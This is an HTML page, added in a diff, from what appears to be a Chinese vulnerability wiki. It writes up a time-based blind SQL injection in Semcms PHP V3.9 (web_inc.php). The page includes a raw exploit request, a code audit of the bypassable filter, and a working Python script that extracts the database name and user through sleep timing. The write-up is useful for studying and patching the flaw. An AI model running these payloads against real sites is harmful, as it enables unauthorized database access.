@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Semcms/Semcms%20PHP%28%E5%A4%9A%E8%AF%AD%29%E7%89%88%20V3.9%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Semcms PHP(多语)版 V3.9 sql注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Semcms PHP(\u591a\u8bed)\u7248 V3.9 sql\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Semcms%20v2.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Semcms%20v2.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Semcms v2.7 sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/Secnet%E5%AE%89%E7%BD%91-%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-actpt_5g-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/Secnet%E5%AE%89%E7%BD%91-%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-actpt_5g-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        Secnet安网 智能AC管理系统 actpt 5g 信息泄露
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="semcms-php-v39-sql">Semcms PHP(多语)版 V3.9 sql注入漏洞<a class="headerlink" href="#semcms-php-v39-sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Semcms PHP(多语)版 V3.9</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞详情<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>漏洞文件为Include下的web_inc.php文件</p>
+<p>包</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/Include/web_inc.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">64</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+
+<span class="nt">languageID</span><span class="o">=</span><span class="s">0 or if(substr(database(),1,1) like 0x6D,sleep(5),1);</span>
+</code></pre></div>
+
+<p>基于时间的注入</p>
+<h3 id="_5">代码审计<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>查看web_inc.php的关键代码</p>
+<div class="codehilite"><pre><span></span><code>if (isset($_POST[&quot;languageID&quot;])){$Language=test_input(verify_str($_POST[&quot;languageID&quot;]));}else{$Language=verify_str($Language);}
+
+if(!empty($Language)){
+
+      //网站SEO设定
+
+      $query=$db_conn-&gt;query(&quot;select * from sc_tagandseo where languageID=$Language&quot;);
+      $row=mysqli_fetch_array($query);
+      $tag_indexmetatit=datato($row[&#39;tag_indexmetatit&#39;]);// 首页标题
+      $tag_indexkey=datato($row[&#39;tag_indexkey&#39;]);// 首页关键词
+      $tag_indexdes=datato($row[&#39;tag_indexdes&#39;]);// 首页描述
+
+......
+</code></pre></div>
+
+<p>可以看到查询语句没有利用单引号闭合</p>
+<p>跟入过滤函数查看</p>
+<div class="codehilite"><pre><span></span><code><span class="n">function</span><span class="w"> </span><span class="n">test_input</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<span class="w">      </span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">str_replace</span><span class="p">(</span><span class="s2">&quot;%&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;percent&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">);</span>
+<span class="w">      </span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">trim</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">);</span>
+<span class="w">      </span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stripslashes</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">);</span>
+<span class="w">      </span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htmlspecialchars</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">,</span><span class="n">ENT_QUOTES</span><span class="p">);</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">;</span>
+
+<span class="w">   </span><span class="p">}</span>
+<span class="n">function</span><span class="w"> </span><span class="n">inject_check_sql</span><span class="p">(</span><span class="o">$</span><span class="n">sql_str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">     </span><span class="k">return</span><span class="w"> </span><span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/select|insert|=|%|&lt;|between|update|</span><span class="se">\&#39;</span><span class="s1">|\*|union|into|load_file|outfile/i&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">sql_str</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">function</span><span class="w"> </span><span class="n">verify_str</span><span class="p">(</span><span class="o">$</span><span class="nb">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">   </span><span class="k">if</span><span class="p">(</span><span class="n">inject_check_sql</span><span class="p">(</span><span class="o">$</span><span class="nb">str</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">       </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Sorry,You do this is wrong! (.-.)&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="nb">str</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>过滤了一些关键字，正常的联合注入是没有办法了，可以时间盲注</p>
+<p>利用<code>if</code>和<code>sleep</code>构造payload，因为<code>&lt;</code>,<code>=</code>被过滤且存在<code>htmlspecialchars</code>函数，利用like代替</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">languageID</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="nv">or</span><span class="w"> </span><span class="k">if</span><span class="ss">(</span><span class="nv">substr</span><span class="ss">(</span><span class="nv">database</span><span class="ss">()</span>,<span class="mi">1</span>,<span class="mi">1</span><span class="ss">)</span><span class="w"> </span><span class="nv">like</span><span class="w"> </span><span class="mi">0</span><span class="nv">x6e</span>,<span class="nv">sleep</span><span class="ss">(</span><span class="mi">5</span><span class="ss">)</span>,<span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
+</code></pre></div>
+
+<p>附上脚本</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># !/usr/bin/python3</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+<span class="c1"># author: Forthrglory</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">getDatabase</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">head</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">}</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">122</span><span class="p">):</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;languageID=0 or if(substr(database(),</span><span class="si">%s</span><span class="s1">,1) like </span><span class="si">%s</span><span class="s1">,sleep(5),1);&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
+
+            <span class="n">result</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">head</span><span class="p">)</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">elapsed</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">):</span>
+                <span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+                <span class="k">break</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;database=&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">getUser</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">head</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">}</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">21</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span><span class="mi">90</span><span class="p">):</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;languageID=0 or if(substr(user(),</span><span class="si">%s</span><span class="s1">,1) like </span><span class="si">%s</span><span class="s1">,sleep(5),1);&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
+
+            <span class="n">result</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">head</span><span class="p">)</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">elapsed</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">):</span>
+                <span class="n">s</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+                <span class="k">break</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;user=&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1/Include/web_inc.php&#39;</span>
+
+    <span class="n">s</span> <span class="o">=</span> <span class="n">getDatabase</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">u</span> <span class="o">=</span> <span class="n">getUser</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</code></pre></div>
+
+<p>运行截图</p>
+<p><img alt="" src="../resource/SemcmsPHP%28%E5%A4%9A%E8%AF%AD%29%E7%89%88V3.9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<p><img alt="" src="../resource/SemcmsPHP%28%E5%A4%9A%E8%AF%AD%29%E7%89%88V3.9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
+<p>不过因为过滤了select，暂时不知道怎么注出数据ORZ，比如说注出user表中的密码之类的，如果有师傅愿意不吝赐教，这里万分感谢</p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7122">https://xz.aliyun.com/t/7122</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Semcms%20v2.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Semcms%20v2.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Semcms v2.7 sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/Secnet%E5%AE%89%E7%BD%91-%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-actpt_5g-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/Secnet%E5%AE%89%E7%BD%91-%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-actpt_5g-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        Secnet安网 智能AC管理系统 actpt 5g 信息泄露
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
